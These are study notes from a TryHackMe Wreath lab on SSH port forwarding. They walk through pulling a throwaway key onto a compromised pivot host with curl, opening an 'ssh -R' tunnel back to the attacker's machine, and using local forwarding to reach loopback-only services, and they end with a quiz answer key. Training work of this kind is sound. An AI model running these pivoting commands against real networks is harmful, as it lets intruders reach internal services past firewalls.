# LAB — SSH Remote Port Forwarding

> **Lab Environment:** TryHackMe Wreath
> **Goal:** Forward an internal service (`10.200.180.150:80`) back to Kali by initiating the tunnel **from the pivot machine**.

---

## Concept

In **remote port forwarding**, the tunnel is initiated **from the pivot (jump) machine** back to your attacking host. The listening port is created **on your Kali**, but the SSH command is run **on the pivot**.

```
LOCAL PORT FORWARDING                    REMOTE PORT FORWARDING
─────────────────────                    ──────────────────────
Run on: Kali                             Run on: Pivot machine
Port opens on: Kali                      Port opens on: Kali
Direction: Kali → pivot → internal       Direction: Pivot → Kali
```

> ⚠️ **Security rule:** NEVER enter your real SSH password on a compromised machine. Use **temporary, disposable SSH keys** instead.

## Step 2 — Generate Temporary SSH Keys

Create a disposable key pair (use it for the task, then delete):

```bash
┌──(kali㉿kali)-[~/Downloads/wreath]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/.ssh/id_tempkey
Enter passphrase for "/home/kali/.ssh/id_tempkey" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_tempkey
Your public key has been saved in /home/kali/.ssh/id_tempkey.pub
```

> Give the full path (e.g., `/home/kali/.ssh/id_tempkey`) to avoid overwriting default keys. Leave the passphrase empty for seamless execution.

Verify the keys were created:

```bash
┌──(kali㉿kali)-[~/Downloads/wreath]
└─$ ls -al /home/kali/.ssh
-rw-------  1 kali kali  399 Sep 15 13:33 id_tempkey
-rw-r--r--  1 kali kali   91 Sep 15 13:33 id_tempkey.pub
```

## Step 3 — Transfer the Private Key to the Pivot Machine

Start a Python HTTP server in the `.ssh` directory on Kali:

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ python3 -m http.server 80
```

On the pivot machine, download the private key:

```bash
curl http://10.250.180.5/id_tempkey -o id_tempkey
```

Set proper permissions:

```bash
chmod 600 id_tempkey
```

---

## Step 4 — Add the Pivot's Public Key to Kali's `authorized_keys`

On the pivot machine, display its existing public key:

```bash
[root@prod-serv .ssh]# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... root@tm-prod-serv
```

On Kali, paste that public key into `~/.ssh/authorized_keys`:

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ gedit authorized_keys
```

Set correct permissions:

```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 authorized_keys
```

### Troubleshooting Key Auth

If key authentication fails (password prompt appears), check Kali's SSH daemon config:

```
/etc/ssh/sshd_config
```

Ensure:
- `PubkeyAuthentication yes` is enabled
- `AuthorizedKeysFile .ssh/authorized_keys` is uncommented

Then restart SSH:

```bash
service ssh restart
```

> **Optional hardening:** Restrict the key in `authorized_keys` with options like `no-pty`, `no-X11-forwarding`, or `permitopen` for enhanced security.

## Step 5 — Execute Remote Port Forwarding (from the Pivot Machine)

### Syntax

```
ssh -R [ATTACKER_LISTEN_PORT]:[TARGET_IP]:[TARGET_PORT] [ATTACKER_USER]@[ATTACKER_IP] -i id_tempkey -fN
```

### With SSH Key

```bash
ssh -R 8000:10.200.180.150:80 kali@10.250.180.5 -i id_tempkey -fN
```

### With Password (fallback — if key auth fails in lab)

```bash
ssh -R 8000:10.200.180.150:80 kali@10.250.180.5 -fN
```

> This is run **on the pivot machine**, not on Kali.

### Generic Template

```
ssh -R <local port to open>:<internal network machine ip>:<target port> kali@<kali ip> -fN
```

### Verify the Process

```bash
[root@prod-serv ~]# ps aux | grep "ssh"
```

## Loopback Service Scenario

In real pentests, internal services (MySQL, internal web apps) are often bound to `127.0.0.1` only — invisible to external Nmap scans.

- Run `netstat -tuln` on the target to discover loopback-bound services.
- Forward them with local port forwarding:

```bash
ssh -L 8000:127.0.0.1:80 user@target_ip -fN
```

Then access via `localhost:8000` on your Kali.

## Lab Quiz — Q&A

| # | Question | Answer |
|---|---|---|
| 1 | If you're connecting from your attacking machine to create a port forward, is it Local or Remote? | **L** (Local) |
| 2 | Which switch combination backgrounds an SSH port forward? | **`-fN`** |
| 3 | Good idea to enter your own password on a remote machine for a reverse proxy? | **Nay** |
| 4 | Command to create throwaway SSH keys for a reverse connection? | **`ssh-keygen`** |
| 5 | Reverse portforward from port 22 of `172.16.0.100` to port 2222 on `172.16.0.200`, key `id_rsa`, backgrounded, user `kali`? | `ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN` |

| 7 | SSH access to `172.16.0.50` with a webserver on `127.0.0.1:80`, forward to local port 8000, user `user`, backgrounded? | `ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN` |

## Summary — Local vs Remote

| Aspect | Local (`-L`) | Remote (`-R`) |
|---|---|---|
| **Run from** | Attacking machine (Kali) | Pivot machine |
| **Port opens on** | Kali | Kali (pushed from pivot) |
| **Direction** | Pull — Kali reaches in to grab internal service | Push — pivot pushes internal service back to Kali |
| **Use when** | You have SSH access from Kali to the pivot | Strict inbound firewall blocks incoming connections to the pivot; or you need to catch reverse shells |
